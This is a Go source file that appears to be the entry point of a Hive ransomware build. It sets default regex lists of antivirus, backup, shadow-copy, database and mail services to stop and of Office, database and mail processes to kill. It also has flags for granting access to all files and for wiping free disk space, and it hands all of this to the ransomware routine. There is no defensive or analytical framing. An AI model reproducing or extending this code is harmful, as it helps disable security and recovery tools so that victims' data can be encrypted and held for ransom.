package main


import (
  "flag"
  "log"
  "hive_v3_demo/hive"
)


// Default regexp of service names that stop
const default_service_stop_list string =
  "acronis|AcrSch2Svc|Antivirus|ARSM|AVP|backup|bedbg|CAARCUpdateSvc|" +
  "CASAD2DWebSvc|ccEvtMgr|ccSetMgr|Culserver|dbeng8|dbsrv12|DCAgent|" +
  "DefWatch|EhttpSrv|ekrn|Enterprise Client Service|EPSecurityService|" +
  "EPUpdateService|EraserSvc11710|EsgShKernel|ESHASRV|FA_Scheduler|" +
  "firebird|IISAdmin|IMAP4Svc|Intuit|KAVFS|KAVFSGT|kavfsslp|klnagent|" +
  "macmnsvc|masvc|MBAMService|MBEndpointAgent|McAfee|McShield|" +
  "McTaskManager|memtas|mepocs|mfefire |mfemms|mfevtp|MMS|MsDtsServer|" +
  "MsDtsServer100|MsDtsServer110|msexchange|msmdsrv|MSOLAP|MVArmor|" +
  "MVarmor64|NetMsmqActivator|ntrtscan|oracle|PDVFSService|POP3Svc|" +
  "postgres|QBCFMonitorService|QBFCService|QBIDPService|redis|report|" +
  "RESvc|RTVscan|sacsvr|SamSs|SAVAdminService|SavRoam|SAVService|SDRSVC|" +
  "SepMasterService|ShMonitor|Smcinst|SmcService|SMTPSvc|SNAC|SntpService|" +
  "sophos|sql|SstpSvc|stc_raw_agent|^svc|swi_|Symantec|TmCCSF|tmlisten|" +
  "tomcat|TrueKey|UI0Detect|veeam|vmware|vss|W3Svc|wbengine|WebClient|" +
  "wrapper|WRSVC|WSBExchange|YooIT|zhudongfangyu|Zoolz"
// Default regexp of process names that kill
const default_process_kill_list string =
  "agntsvc|sql|CNTAoSMgr|dbeng50|dbsnmp|encsvc|excel|firefoxconfig|" +
  "infopath|mbamtray|msaccess|mspub|mydesktop|Ntrtscan|ocautoupds|ocomm|" +
  "ocssd|onenote|oracle|outlook|PccNTMon|powerpnt|sqbcoreservice|steam|" +
  "synctime|tbirdconfig|thebat|thunderbird|tmlisten|visio|word|xfssvccon|" +
  "zoolz"
// Default regexp of file names that skip
const default_file_skip_list string = ""


// Main
func main() {

  arg_stop := flag.String("stop", default_service_stop_list,
                          "Stop services by case insensitive regex of its names")

  arg_kill := flag.String("kill", default_process_kill_list,
                          "Kill processes by case insensetive regex of its names")

  arg_skip := flag.String("skip", default_file_skip_list,
                          "Skip files by case insensetive regex of its names")

  arg_grant := flag.Bool("grant", false, "Grant permissions to all files")

  arg_nowipe := flag.Bool("no-wipe", false,
                          "Skip wipe free disk space stage")

  flag.Parse()

  log.SetFlags(log.Ltime)

  hive_ctx := new(hive.HiveContext)

  hive_ctx.ServiceStopList = *arg_stop
  hive_ctx.ProcessKillList = *arg_kill
  hive_ctx.FileSkipList = *arg_skip
  hive_ctx.SkipWipe = *arg_nowipe
  hive_ctx.Grant = *arg_grant
  hive_ctx.CmdArgs = flag.Args()

  // Hive main function
  err := hive_ctx.RunProcess()

  if err != nil {
    log.Fatal(err)
  }
}
